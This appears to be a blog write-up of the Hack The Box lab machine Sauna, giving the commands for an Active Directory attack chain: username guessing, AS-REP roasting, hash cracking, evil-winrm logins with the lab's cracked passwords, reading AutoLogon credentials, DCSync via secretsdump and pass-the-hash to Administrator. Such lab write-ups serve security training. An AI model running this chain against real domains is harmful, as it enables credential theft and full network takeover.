+++
title = 'Hack The Box — Sauna Writeup'
date = '2026-06-10'
draft = false
tags = ["Hack The Box", "Windows", "Active Directory"]
summary = 'An easy-rated Active Directory box involving web enumeration and AS-REP roasting for initial access, AutoLogon credentials for lateral movement, and abusing rights to achieve DCSync - leading to full domain compromise.'
[cover]
image = 'main.png'
+++

This is a walkthrough of the machine Sauna from Hack The Box.

Machine information:
- **Difficulty**: Easy‍
- **OS**: Windows
- **Area of interest**: Enterprise Network, Vulnerability Assessment, Active Directory, Security Tools, Authentication‍
- **Vulnerability**: Misconfiguration, Autologon Credentials‍
- **Technique**: Reconnaissance, User Enumeration, Password Cracking, ASREPRoasting, AD DCSync, Pass the Hash

# Nmap

```bash
sudo nmap -A --open -v -p- <IP>
```

Starting off with an Nmap scan, we discover that the machine is a **domain controller**, and that the domain name is **egotistical-bank.local**.

{{< figure src="image_1.png" align="center" >}}

# Webapp enumeration

Looking at the web application on port **80**, we discover employees' names on the page `/about.html`:

{{< figure src="image_2.png" align="center" >}}

# Compiling a list of possible usernames

Using the discovered names, we can manually create a file of possibly valid usernames, including common permutations:

```
fergus.smith
shaun.coins
bowie.taylor
hugo.bear
steve.kerb
sophie.driver
fergus_smith
shaun_coins
bowie_taylor
hugo_bear
steve_kerb
sophie_driver
f.smith
s.coins
h.bear
b.taylor
s.kerb
s.driver
fsmith
scoins
hbear
btaylor
skerb
sdriver
```

# AS-REP Roasting

Next, we will use the usernames we have created to try AS-REP roasting with `impacket-GetNPUsers`:

```bash
impacket-GetNPUsers -dc-ip <IP> -usersfile usernames EGOTISTICAL-BANK.LOCAL/
```

And we get a hit on the user **fsmith**:

{{< figure src="image_3.png" align="center" >}}

# Initial access

We will use `hashcat` in order to crack this hash and get a plaintext credential:

```bash
hashcat -m 18200 fsmith.asrep /usr/share/wordlists/rockyou.txt --force
```

{{< figure src="image_4.png" align="center" >}}

With a pair of credentials in hand, we can obtain initial access with `evil-winrm`, and read the first `user.txt` flag:

```bash
evil-winrm -i <IP> -u fsmith -p "Thestrokes23"
```

{{< figure src="image_5.png" align="center" >}}

# Lateral movement

Digging around the machine, eventually we find **AutoLogon** configured and obtain credentials from here, this can be discovered either using **WinPEAS**, or by querying the registry:

```powershell
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

{{< figure src="image_6.png" align="center" >}}

However, note that the username from the registry; **svc_loanmanager** is invalid. Looking at existing users, we find a similarly named one; **svc_loanmgr**:

{{< figure src="image_7.png" align="center" >}}

Using `evil-winrm` again, we can get a shell as **svc_loanmgr**:

```bash
evil-winrm -i <IP> -u svc_loanmgr -p "Moneymakestheworldgoround\!"
```

# Privilege escalation

We will upload the **SharpHound** executable using `evil-winrm`:

```
upload SharpHound.exe
```

Next, we will start collection, save the output files and ingest them into BloodHound:

```powershell
.\SharpHound.exe -c All --outputdirectory C:\Users\svc_loanmgr\Documents\ --outputprefix sauna
```

```bash
bloodhound
```

In BloodHound, we can click on our current user; **svc_loanmgr**, and check what **outbound controls** we have:

{{< figure src="image_8.png" align="center" >}}

**svc_loanmgr** has `GetChangesAll` and `GetChanges` over the **domain object**.

Clicking on each of these rights in BloodHound and reviewing the *General* and *Linux Abuse* tabs reveals that; when paired, we can execute a **DCSync** with `impacket-secretsdump`:

{{< figure src="image_9.png" align="center" >}}

{{< figure src="image_10.png" align="center" >}}

{{< figure src="image_11.png" align="center" >}}

{{< figure src="image_12.png" align="center" >}}

Finally, we can use `impacket-secretsdump`, and **pass the dumped hash** with `evil-winrm` to get a shell as **administrator**, and read the second `root.txt` flag:

```bash
impacket-secretsdump EGOTISTICAL-BANK/svc_loanmgr:"Moneymakestheworldgoround\!"@<IP> -just-dc
```

{{< figure src="image_13.png" align="center" >}}

```bash
evil-winrm -i <IP> -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e
```

{{< figure src="image_14.png" align="center" >}}